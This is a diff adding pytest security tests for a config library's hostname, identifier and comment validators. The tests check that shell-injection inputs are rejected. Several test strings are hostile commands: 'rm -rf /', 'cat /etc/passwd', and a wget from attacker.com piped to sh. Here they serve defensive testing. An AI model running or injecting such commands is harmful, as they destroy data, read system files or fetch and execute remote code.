@@ -3,12 +3,12 @@
 import pytest
 
 from wanctl.config_base import (
+    BaseConfig,
     ConfigValidationError,
     _get_nested,
     _type_name,
     validate_field,
     validate_schema,
-    BaseConfig,
 )
 
 
@@ -274,3 +274,351 @@ class TestBaseConfigValidation:
         with pytest.raises(ConfigValidationError) as exc_info:
             BaseConfig.validate_comment(123, "field_name")
         assert "expected string" in str(exc_info.value)
+
+
+class TestValidatePingHost:
+    """Tests for validate_ping_host security validation."""
+
+    # -------------------------------------------------------------------------
+    # Valid inputs
+    # -------------------------------------------------------------------------
+
+    def test_valid_ipv4_addresses(self):
+        """Test valid IPv4 addresses are accepted."""
+        valid_ipv4s = [
+            "1.1.1.1",
+            "8.8.8.8",
+            "192.168.1.1",
+            "10.0.0.1",
+            "255.255.255.255",
+            "0.0.0.0",
+        ]
+        for ip in valid_ipv4s:
+            result = BaseConfig.validate_ping_host(ip, "ping_host")
+            assert result == ip
+
+    def test_valid_ipv6_addresses(self):
+        """Test valid IPv6 addresses are accepted."""
+        valid_ipv6s = [
+            "2001:4860:4860::8888",
+            "2001:4860:4860::8844",
+            "::1",
+            "fe80::1",
+            "2607:f8b0:4004:800::200e",
+        ]
+        for ip in valid_ipv6s:
+            result = BaseConfig.validate_ping_host(ip, "ping_host")
+            assert result == ip
+
+    def test_valid_hostnames(self):
+        """Test valid hostnames are accepted."""
+        valid_hostnames = [
+            "dns.google",
+            "cloudflare.com",
+            "one.one.one.one",
+            "example.com",
+            "sub.domain.example.org",
+            "a.b.c.d.e.f.example.com",
+        ]
+        for hostname in valid_hostnames:
+            result = BaseConfig.validate_ping_host(hostname, "ping_host")
+            assert result == hostname
+
+    def test_valid_single_label_hostname(self):
+        """Test single-label hostnames are valid."""
+        assert BaseConfig.validate_ping_host("localhost", "host") == "localhost"
+        assert BaseConfig.validate_ping_host("router", "host") == "router"
+
+    def test_hostname_with_numbers(self):
+        """Test hostnames containing numbers are valid."""
+        assert BaseConfig.validate_ping_host("ns1.google.com", "host") == "ns1.google.com"
+        assert BaseConfig.validate_ping_host("1e100.net", "host") == "1e100.net"
+
+    def test_hostname_with_hyphens(self):
+        """Test hostnames with hyphens are valid."""
+        assert BaseConfig.validate_ping_host("my-router.local", "host") == "my-router.local"
+        assert BaseConfig.validate_ping_host("test-1-2-3.example.com", "host") == "test-1-2-3.example.com"
+
+    # -------------------------------------------------------------------------
+    # Command injection attacks (security-critical)
+    # -------------------------------------------------------------------------
+
+    def test_command_injection_semicolon(self):
+        """Test that semicolon injection is rejected."""
+        with pytest.raises(ConfigValidationError) as exc_info:
+            BaseConfig.validate_ping_host("127.0.0.1; cat /etc/passwd", "ping_host")
+        assert "must be valid IPv4, IPv6" in str(exc_info.value)
+
+    def test_command_injection_backticks(self):
+        """Test that backtick command substitution is rejected."""
+        with pytest.raises(ConfigValidationError) as exc_info:
+            BaseConfig.validate_ping_host("`whoami`", "ping_host")
+        assert "must be valid IPv4, IPv6" in str(exc_info.value)
+
+    def test_command_injection_dollar_paren(self):
+        """Test that $() command substitution is rejected."""
+        with pytest.raises(ConfigValidationError) as exc_info:
+            BaseConfig.validate_ping_host("$(whoami)", "ping_host")
+        assert "must be valid IPv4, IPv6" in str(exc_info.value)
+
+    def test_command_injection_pipe(self):
+        """Test that pipe injection is rejected."""
+        with pytest.raises(ConfigValidationError) as exc_info:
+            BaseConfig.validate_ping_host("127.0.0.1 | rm -rf /", "ping_host")
+        assert "must be valid IPv4, IPv6" in str(exc_info.value)
+
+    def test_command_injection_ampersand(self):
+        """Test that ampersand injection is rejected."""
+        with pytest.raises(ConfigValidationError) as exc_info:
+            BaseConfig.validate_ping_host("127.0.0.1 && rm -rf /", "ping_host")
+        assert "must be valid IPv4, IPv6" in str(exc_info.value)
+
+    def test_command_injection_newline(self):
+        """Test that newline injection is rejected."""
+        with pytest.raises(ConfigValidationError) as exc_info:
+            BaseConfig.validate_ping_host("127.0.0.1\nrm -rf /", "ping_host")
+        assert "must be valid IPv4, IPv6" in str(exc_info.value)
+
+    def test_command_injection_redirect(self):
+        """Test that redirect injection is rejected."""
+        with pytest.raises(ConfigValidationError) as exc_info:
+            BaseConfig.validate_ping_host("127.0.0.1 > /tmp/pwned", "ping_host")
+        assert "must be valid IPv4, IPv6" in str(exc_info.value)
+
+    def test_command_injection_variable_expansion(self):
+        """Test that shell variable expansion is rejected."""
+        with pytest.raises(ConfigValidationError) as exc_info:
+            BaseConfig.validate_ping_host("${PATH}", "ping_host")
+        assert "must be valid IPv4, IPv6" in str(exc_info.value)
+
+    def test_command_injection_complex_payload(self):
+        """Test complex injection payloads are rejected."""
+        payloads = [
+            "1.1.1.1;id",
+            "1.1.1.1|id",
+            "1.1.1.1`id`",
+            "1.1.1.1$(id)",
+            "a]&&id||[",
+            "google.com;wget attacker.com/shell.sh|sh",
+        ]
+        for payload in payloads:
+            with pytest.raises(ConfigValidationError):
+                BaseConfig.validate_ping_host(payload, "ping_host")
+
+    # -------------------------------------------------------------------------
+    # Invalid hostname patterns
+    # -------------------------------------------------------------------------
+
+    def test_hostname_starting_with_hyphen(self):
+        """Test hostname starting with hyphen is invalid."""
+        with pytest.raises(ConfigValidationError):
+            BaseConfig.validate_ping_host("-invalid.com", "host")
+
+    def test_hostname_ending_with_hyphen(self):
+        """Test hostname ending with hyphen is invalid."""
+        with pytest.raises(ConfigValidationError):
+            BaseConfig.validate_ping_host("invalid-.com", "host")
+
+    def test_hostname_with_underscore(self):
+        """Test hostname with underscore is invalid (per RFC)."""
+        # Note: underscores are technically invalid in hostnames per RFC 1123
+        # but some systems accept them. This tests the strict validation.
+        with pytest.raises(ConfigValidationError):
+            BaseConfig.validate_ping_host("invalid_host.com", "host")
+
+    def test_hostname_with_spaces(self):
+        """Test hostname with spaces is invalid."""
+        with pytest.raises(ConfigValidationError):
+            BaseConfig.validate_ping_host("invalid host.com", "host")
+
+    def test_hostname_label_too_long(self):
+        """Test hostname with label > 63 chars is invalid."""
+        long_label = "a" * 64 + ".com"
+        with pytest.raises(ConfigValidationError):
+            BaseConfig.validate_ping_host(long_label, "host")
+
+    # -------------------------------------------------------------------------
+    # IPv4-like patterns behavior
+    # Note: These strings match the hostname regex even though they look like
+    # malformed IPv4. This is expected behavior since the validator accepts
+    # valid hostnames, and "256.1.1.1" is a valid hostname syntax-wise.
+    # -------------------------------------------------------------------------
+
+    def test_ipv4_like_strings_accepted_as_hostnames(self):
+        """Test that IPv4-like strings are accepted as valid hostnames.
+
+        The validator checks: valid IPv4 OR valid IPv6 OR valid hostname.
+        Strings like '256.1.1.1' or '192.168.1' fail IPv4 validation but
+        pass hostname validation (since they're syntactically valid hostnames).
+        This is correct behavior - DNS could resolve these names.
+        """
+        # These fail IPv4 validation but pass hostname validation
+        assert BaseConfig.validate_ping_host("256.1.1.1", "ping_host") == "256.1.1.1"
+        assert BaseConfig.validate_ping_host("192.168.1", "ping_host") == "192.168.1"
+        assert BaseConfig.validate_ping_host("192.168.1.1.1", "ping_host") == "192.168.1.1.1"
+
+    def test_invalid_ipv4_negative_octet(self):
+        """Test IPv4 with negative octet is rejected (hyphen at start of label)."""
+        with pytest.raises(ConfigValidationError):
+            BaseConfig.validate_ping_host("-1.1.1.1", "ping_host")
+
+    # -------------------------------------------------------------------------
+    # Edge cases
+    # -------------------------------------------------------------------------
+
+    def test_empty_string_rejected(self):
+        """Test empty string is rejected."""
+        with pytest.raises(ConfigValidationError) as exc_info:
+            BaseConfig.validate_ping_host("", "ping_host")
+        assert "cannot be empty" in str(exc_info.value)
+
+    def test_non_string_rejected(self):
+        """Test non-string input is rejected."""
+        with pytest.raises(ConfigValidationError) as exc_info:
+            BaseConfig.validate_ping_host(123, "ping_host")
+        assert "expected string" in str(exc_info.value)
+
+    def test_none_rejected(self):
+        """Test None is rejected."""
+        with pytest.raises(ConfigValidationError) as exc_info:
+            BaseConfig.validate_ping_host(None, "ping_host")
+        assert "expected string" in str(exc_info.value)
+
+    def test_list_rejected(self):
+        """Test list is rejected."""
+        with pytest.raises(ConfigValidationError) as exc_info:
+            BaseConfig.validate_ping_host(["1.1.1.1"], "ping_host")
+        assert "expected string" in str(exc_info.value)
+
+    def test_too_long_rejected(self):
+        """Test string exceeding max length is rejected."""
+        long_host = "a." * 130  # 260 chars > 256 max
+        with pytest.raises(ConfigValidationError) as exc_info:
+            BaseConfig.validate_ping_host(long_host, "ping_host")
+        assert "too long" in str(exc_info.value)
+
+
+class TestValidateIdentifierSecurityEdgeCases:
+    """Additional security edge cases for validate_identifier."""
+
+    def test_command_injection_dollar_paren(self):
+        """Test $() command substitution is rejected."""
+        with pytest.raises(ConfigValidationError):
+            BaseConfig.validate_identifier("queue$(id)", "queue_name")
+
+    def test_command_injection_backticks(self):
+        """Test backtick command substitution is rejected."""
+        with pytest.raises(ConfigValidationError):
+            BaseConfig.validate_identifier("queue`id`", "queue_name")
+
+    def test_shell_variable_expansion(self):
+        """Test shell variable expansion is rejected."""
+        with pytest.raises(ConfigValidationError):
+            BaseConfig.validate_identifier("queue${PATH}", "queue_name")
+
+    def test_double_quotes(self):
+        """Test double quotes are rejected."""
+        with pytest.raises(ConfigValidationError):
+            BaseConfig.validate_identifier('queue"injection', "queue_name")
+
+    def test_single_quotes(self):
+        """Test single quotes are rejected."""
+        with pytest.raises(ConfigValidationError):
+            BaseConfig.validate_identifier("queue'injection", "queue_name")
+
+    def test_hash_comment(self):
+        """Test hash comment injection is rejected."""
+        with pytest.raises(ConfigValidationError):
+            BaseConfig.validate_identifier("queue#comment", "queue_name")
+
+    def test_newline_with_command(self):
+        """Test newline followed by command is rejected."""
+        with pytest.raises(ConfigValidationError):
+            BaseConfig.validate_identifier("queue\nrm -rf /", "queue_name")
+
+    def test_carriage_return_injection(self):
+        """Test carriage return injection is rejected."""
+        with pytest.raises(ConfigValidationError):
+            BaseConfig.validate_identifier("queue\r\nrm -rf /", "queue_name")
+
+    def test_null_byte_injection(self):
+        """Test null byte injection is rejected."""
+        with pytest.raises(ConfigValidationError):
+            BaseConfig.validate_identifier("queue\x00command", "queue_name")
+
+    def test_unicode_bypass_attempt(self):
+        """Test unicode lookalike characters are rejected."""
+        # Using a unicode semicolon (GREEK QUESTION MARK U+037E looks like ;)
+        with pytest.raises(ConfigValidationError):
+            BaseConfig.validate_identifier("queue\u037Ecommand", "queue_name")
+
+
+class TestValidateCommentSecurityEdgeCases:
+    """Additional security edge cases for validate_comment."""
+
+    def test_double_quotes_rejected(self):
+        """Test double quotes are rejected in comments."""
+        with pytest.raises(ConfigValidationError):
+            BaseConfig.validate_comment('comment"injection', "comment")
+
+    def test_single_quotes_rejected(self):
+        """Test single quotes are rejected in comments."""
+        with pytest.raises(ConfigValidationError):
+            BaseConfig.validate_comment("comment'injection", "comment")
+
+    def test_backticks_rejected(self):
+        """Test backticks are rejected in comments."""
+        with pytest.raises(ConfigValidationError):
+            BaseConfig.validate_comment("comment`id`", "comment")
+
+    def test_dollar_paren_rejected(self):
+        """Test $() is rejected in comments."""
+        with pytest.raises(ConfigValidationError):
+            BaseConfig.validate_comment("comment$(id)", "comment")
+
+    def test_shell_variable_rejected(self):
+        """Test shell variables are rejected in comments."""
+        with pytest.raises(ConfigValidationError):
+            BaseConfig.validate_comment("comment${PATH}", "comment")
+
+    def test_newline_injection_rejected(self):
+        """Test newline injection is rejected."""
+        with pytest.raises(ConfigValidationError):
+            BaseConfig.validate_comment("comment\nrm -rf /", "comment")
+
+    def test_pipe_rejected(self):
+        """Test pipe character is rejected."""
+        with pytest.raises(ConfigValidationError):
+            BaseConfig.validate_comment("comment|command", "comment")
+
+    def test_semicolon_rejected(self):
+        """Test semicolon is rejected."""
+        with pytest.raises(ConfigValidationError):
+            BaseConfig.validate_comment("comment;rm -rf /", "comment")
+
+    def test_ampersand_rejected(self):
+        """Test ampersand is rejected."""
+        with pytest.raises(ConfigValidationError):
+            BaseConfig.validate_comment("comment&&rm -rf /", "comment")
+
+    def test_redirect_rejected(self):
+        """Test redirect characters are rejected."""
+        with pytest.raises(ConfigValidationError):
+            BaseConfig.validate_comment("comment>/tmp/pwned", "comment")
+
+    def test_parentheses_rejected(self):
+        """Test parentheses are rejected."""
+        with pytest.raises(ConfigValidationError):
+            BaseConfig.validate_comment("comment(subshell)", "comment")
+
+    def test_valid_adaptive_steer_comment(self):
+        """Test the actual production comment format is valid."""
+        comment = "ADAPTIVE: Steer latency-sensitive to ATT"
+        result = BaseConfig.validate_comment(comment, "mangle_comment")
+        assert result == comment
+
+    def test_valid_rule_name_comment(self):
+        """Test rule name with allowed characters."""
+        comment = "Rule-Name_123: Description here"
+        result = BaseConfig.validate_comment(comment, "mangle_comment")
+        assert result == comment
